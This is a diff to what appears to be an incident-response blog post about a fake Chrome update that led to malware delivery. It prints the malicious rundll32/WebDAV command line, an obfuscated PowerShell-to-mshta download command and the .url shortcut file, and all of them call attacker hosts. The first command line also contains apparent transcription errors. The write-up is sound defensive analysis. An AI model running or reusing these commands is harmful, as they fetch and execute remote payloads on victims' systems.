@@ -6,11 +6,13 @@ categories: blog
 
 Today we received an alert about and endpoint running a suspicious commandline:
 
+`rund1132.exe C: \WINDOWS\system32\davcInt.dIl, DavSetCookie 185.252.179.64080 hxxp://185.252.179.64/Downloads`
+
 [![7-31-23_1.png](/assets/images/7-31-23/7-31-23_1.png)](/assets/images/7-31-23/7-31-23_1.png)
 
 This commandline downloaded a .lnk file, inside the .lnk file was the following command:
 
-"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \W*\\\\*2\\\m*h*a*e ('http'+'s://alexiakombou.com/wp-content/uploads/2021/12/EN-localer.'+'hta')
+`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \W*\\\\*2\\\m*h*a*e ('http'+'s://alexiakombou.com/wp-content/uploads/2021/12/EN-localer.'+'hta')`
 
 [![7-31-23_2.png](/assets/images/7-31-23/7-31-23_2.png)](/assets/images/7-31-23/7-31-23_2.png)
 
@@ -18,6 +20,21 @@ This commandline downloaded a .lnk file, inside the .lnk file was the following 
 I was surprised to see davclnt.dll in use here. After some further investigation, we discovered the root of the rundll32 command was a fake Google Chrome update page that the user encountered. When they clicked to update, a .url file was downloaded
 
 [![7-31-23_1-1.png](/assets/images/7-31-23/7-31-23_1-1.png)](/assets/images/7-31-23/7-31-23_1-1.png)
+
+`silent.url`
+<details>
+	<summary>Click to expand</summary>
+	<pre>
+		
+[InternetShortcut]
+URL=file:\\185.252.179.64@80\Downloads\silentupdater-chr(v105).lnk
+ShowCommand=7
+IconIndex=96
+IconFile=C:\Windows\System32\shell32.dll
+
+	</pre>
+
+</details>
 
 When launched, this prompted Window to execute rundll32,davclnt.dll and connect to the malicious ip to download the .lnk file.
 The contents of the .lnk file were the powershell command to run mshta.
